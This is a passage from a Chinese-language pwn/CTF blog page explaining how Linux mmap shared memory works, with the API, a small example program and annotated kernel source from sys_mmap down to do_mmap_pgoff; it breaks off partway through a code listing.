<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/19/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/19/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/21/Principles%EF%BC%9A%E5%85%B1%E4%BA%AB%E5%86%85%E5%AD%98mmap%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/21/Principles%EF%BC%9A%E5%85%B1%E4%BA%AB%E5%86%85%E5%AD%98mmap%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">Principles：共享内存mmap底层原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-09-21 11:13:26" itemprop="dateCreated datePublished" datetime="2022-09-21T11:13:26+08:00">2022-09-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-09-22 14:56:24" itemprop="dateModified" datetime="2022-09-22T14:56:24+08:00">2022-09-22</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Principles/" itemprop="url" rel="index"><span itemprop="name">Principles</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>20k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>18 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>共享内存基础知识</strong></p>
<p>共享内存有两个，一个 mmap，一个 systemV 的 shm</p>
<p>由于所有用户进程总的虚拟地址空间比可用的物理内存大很多，因此只有最常用的部分才与物理页帧关联（这不是问题，因为大多数程序只占用实际可用内存的一小部分）</p>
<ul>
<li>在将磁盘上的数据映射到进程的虚拟地址空间的时，内核必须提供数据结构，以建立虚拟地址空间的区域和相关数据所在位置之间的关联，Linux 软件系统多级页表映射机制</li>
<li>共享内存使得多个进程可以访问同一块内存空间（节约了内存空间），不同进程可以及时看到对方进程中对共享内存中数据得更新（多个进程可以同时操作，所以需要进行同步 ，一般与信号量配合使用）</li>
</ul>
<p>本文主要介绍 mmap</p>
<p><strong>共享内存的 API</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *addr, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags, <span class="keyword">int</span> fd, <span class="keyword">off_t</span> offset)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>addr：<ul>
<li>指定了映射被放置的虚拟地址，首选做法是将 addr 指定为 NULL，内核会为映射选择一个合适的地址（将 addr 指定为非 NULL，内核会将该参数值作为一个提示信息来处理）</li>
</ul>
</li>
<li>length：<ul>
<li>指定了映射字节数，如果 length 不是分页的整数倍，内核会以分页大小为单位建立映射</li>
</ul>
</li>
<li>prot：是一个位掩码，指定了新内存映射上的保护信息</li>
<li>flags：是一个控制映射操作各个方面的选项的位掩码（只能选一个）<ul>
<li>MAP_PRIVATE - 私有：对映射区域的写入操作会产生一个映射文件的复制，即私人的“写入时复制”（copy on write）对此区域作的任何修改都不会写回原来的文件内容 </li>
<li>MAP_SHARED - 共有：对映射区域的写入数据会复制回文件内，而且允许其他映射该文件的进程共享</li>
<li>MAP_ANONYMOUS - 匿名：建立匿名映射，此时会忽略参数fd，不涉及文件（其实是使用 <code>/dev/zero</code> 文件），而且映射区域无法和其他进程共享</li>
</ul>
</li>
<li>匿名映射会忽略下面两个参数：<ul>
<li>fd：表示映射的文件的文件描述符</li>
<li>offset：指定了映射在文件中的起点，必须是系统分页大小的倍数</li>
</ul>
</li>
<li>return：<ul>
<li>成功：返回被映射区的指针 </li>
<li>出错：返回 “-1”，错误原因存于 error 中</li>
</ul>
</li>
</ul>
<p><strong>共享内存使用案例</strong></p>
<p>mmap：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;./flag.txt&quot;</span>, <span class="number">0666</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">-1</span> == fd)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> length = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// char *addr = (char*)mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);</span></span><br><span class="line">    <span class="keyword">char</span> *addr = (<span class="keyword">char</span>*)mmap(<span class="literal">NULL</span>, length, PROT_READ|PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(addr == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;get data from mmap:&quot;</span>);</span><br><span class="line">    write(<span class="number">1</span>,addr,<span class="number">0x40</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;input data to mmap:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,addr,<span class="number">0x40</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(munmap(addr, length) == <span class="number">-1</span>) <span class="comment">/* 解除映射区域 */</span></span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;munmap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>效果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffff7fcf000</span>     <span class="number">0x7ffff7fd0000</span> r--p     <span class="number">1000</span> <span class="number">0</span>      /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">0x7ffff7fd0000</span>     <span class="number">0x7ffff7ff3000</span> r-xp    <span class="number">23000</span> <span class="number">1000</span>   /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">0x7ffff7ff3000</span>     <span class="number">0x7ffff7ffb000</span> r--p     <span class="number">8000</span> <span class="number">24000</span>  /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">0x7ffff7ffb000</span>     <span class="number">0x7ffff7ffc000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      /home/yhellow/桌面/<span class="built_in">exp</span>/flag.txt <span class="comment">/* target */</span></span><br><span class="line"><span class="number">0x7ffff7ffc000</span>     <span class="number">0x7ffff7ffd000</span> r--p     <span class="number">1000</span> <span class="number">2</span>c000  /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">0x7ffff7ffd000</span>     <span class="number">0x7ffff7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">2</span>d000  /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br></pre></td></tr></table></figure>
<ul>
<li>其实 mmap 也可以用来进程间通信，但是用它分配内存的情况多一点</li>
</ul>
<p><strong>Linux 中 mmap 的实现</strong></p>
<p>mmap 的作用就是把磁盘文件的一部分（指定 fd）直接映射到进程的内存中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ffff7eda8e4</span> &lt;mmap64+<span class="number">36</span>&gt;    syscall  &lt;SYS_mmap&gt;</span><br><span class="line">       addr: <span class="number">0x0</span></span><br><span class="line">       len: <span class="number">0x1</span></span><br><span class="line">       prot: <span class="number">0x3</span></span><br><span class="line">       flags: <span class="number">0x2</span></span><br><span class="line">       fd: <span class="number">0x3</span> (/home/yhellow/桌面/<span class="built_in">exp</span>/flag.txt)</span><br><span class="line">       offset: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">asmlinkage <span class="keyword">unsigned</span> <span class="keyword">long</span></span></span><br><span class="line"><span class="function"><span class="title">sys_mmap</span> <span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags, <span class="keyword">int</span> fd, <span class="keyword">long</span> off)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (offset_in_page(off) != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	addr = ksys_mmap_pgoff(addr, len, prot, flags, fd, off &gt;&gt; PAGE_SHIFT); <span class="comment">/* 核心函数 */</span></span><br><span class="line">	<span class="keyword">if</span> (!IS_ERR((<span class="keyword">void</span> *) addr))</span><br><span class="line">		force_successful_syscall_return();</span><br><span class="line">	<span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">ksys_mmap_pgoff</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len,</span></span></span><br><span class="line"><span class="params"><span class="function">			      <span class="keyword">unsigned</span> <span class="keyword">long</span> prot, <span class="keyword">unsigned</span> <span class="keyword">long</span> flags,</span></span></span><br><span class="line"><span class="params"><span class="function">			      <span class="keyword">unsigned</span> <span class="keyword">long</span> fd, <span class="keyword">unsigned</span> <span class="keyword">long</span> pgoff)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> retval;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!(flags &amp; MAP_ANONYMOUS)) &#123; <span class="comment">/* MAP_ANONYMOUS:匿名的 */</span></span><br><span class="line">		audit_mmap_fd(fd, flags); <span class="comment">/* 把&#x27;fd&#x27;和&#x27;flags&#x27;写到mmap结构体中 */</span></span><br><span class="line">		file = fget(fd); <span class="comment">/* 获取对应的文件 */</span></span><br><span class="line">		<span class="keyword">if</span> (!file)</span><br><span class="line">			<span class="keyword">return</span> -EBADF;</span><br><span class="line">		<span class="keyword">if</span> (is_file_hugepages(file))</span><br><span class="line">			len = ALIGN(len, huge_page_size(hstate_file(file))); <span class="comment">/* 对齐 */</span></span><br><span class="line">		retval = -EINVAL;</span><br><span class="line">		<span class="keyword">if</span> (unlikely(flags &amp; MAP_HUGETLB &amp;&amp; !is_file_hugepages(file)))</span><br><span class="line">			<span class="keyword">goto</span> out_fput;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (flags &amp; MAP_HUGETLB) &#123; <span class="comment">/* MAP_HUGETLB:大页面映射 */</span></span><br><span class="line">		struct user_struct *user = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">hstate</span> *<span class="title">hs</span>;</span></span><br><span class="line"></span><br><span class="line">		hs = hstate_sizelog((flags &gt;&gt; MAP_HUGE_SHIFT) &amp; MAP_HUGE_MASK); <span class="comment">/* 生成状态日志 */</span></span><br><span class="line">		<span class="keyword">if</span> (!hs)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">		len = ALIGN(len, huge_page_size(hs)); <span class="comment">/* 对齐 */</span></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * VM_NORESERVE is used because the reservations will be</span></span><br><span class="line"><span class="comment">		 * taken when vm_ops-&gt;mmap() is called</span></span><br><span class="line"><span class="comment">		 * A dummy user value is used because we are not locking</span></span><br><span class="line"><span class="comment">		 * memory so no accounting is necessary</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		file = hugetlb_file_setup(HUGETLB_ANON_FILE, len,</span><br><span class="line">				VM_NORESERVE,</span><br><span class="line">				&amp;user, HUGETLB_ANONHUGE_INODE,</span><br><span class="line">				(flags &gt;&gt; MAP_HUGE_SHIFT) &amp; MAP_HUGE_MASK); <span class="comment">/* 启用严格记账 */</span></span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(file))</span><br><span class="line">			<span class="keyword">return</span> PTR_ERR(file);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	flags &amp;= ~(MAP_EXECUTABLE | MAP_DENYWRITE); <span class="comment">/* 去掉可执行权限,去掉不可写权限 */</span></span><br><span class="line"></span><br><span class="line">	retval = vm_mmap_pgoff(file, addr, len, prot, flags, pgoff); <span class="comment">/* 核心函数 */</span></span><br><span class="line">out_fput:</span><br><span class="line">	<span class="keyword">if</span> (file)</span><br><span class="line">		fput(file);</span><br><span class="line">	<span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>简单检查并处理了一下标志位，然后进行对齐</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">vm_mmap_pgoff</span><span class="params">(struct file *file, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr,</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">unsigned</span> <span class="keyword">long</span> prot,</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">unsigned</span> <span class="keyword">long</span> flag, <span class="keyword">unsigned</span> <span class="keyword">long</span> pgoff)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> ret;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm; <span class="comment">/* 获取当前进程的内存描述符 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> populate;</span><br><span class="line">	LIST_HEAD(uf);</span><br><span class="line"></span><br><span class="line">	ret = security_mmap_file(file, prot, flag); <span class="comment">/* 内核sandboxing功能,通过sandboxing调用mmap_file函数,如果是文件映射会mmap_file会对文件进行权限检查之类操作 */</span></span><br><span class="line">	<span class="keyword">if</span> (!ret) &#123;</span><br><span class="line">		<span class="keyword">if</span> (down_write_killable(&amp;mm-&gt;mmap_sem)) </span><br><span class="line">			<span class="keyword">return</span> -EINTR;</span><br><span class="line">		ret = do_mmap_pgoff(file, addr, len, prot, flag, pgoff,</span><br><span class="line">				    &amp;populate, &amp;uf); <span class="comment">/* 核心函数 */</span></span><br><span class="line">		up_write(&amp;mm-&gt;mmap_sem);</span><br><span class="line">		userfaultfd_unmap_complete(mm, &amp;uf);</span><br><span class="line">		<span class="keyword">if</span> (populate)</span><br><span class="line">			mm_populate(ret, populate);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>security_mmap_file</code> 最终会调用 <code>ima_file_mmap</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">long</span></span></span><br><span class="line"><span class="function"><span class="title">do_mmap_pgoff</span><span class="params">(struct file *file, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr,</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">unsigned</span> <span class="keyword">long</span> prot, <span class="keyword">unsigned</span> <span class="keyword">long</span> flags,</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">unsigned</span> <span class="keyword">long</span> pgoff, <span class="keyword">unsigned</span> <span class="keyword">long</span> *populate,</span></span></span><br><span class="line"><span class="params"><span class="function">	struct list_head *uf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> do_mmap(file, addr, len, prot, flags, <span class="number">0</span>, pgoff, populate, uf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span 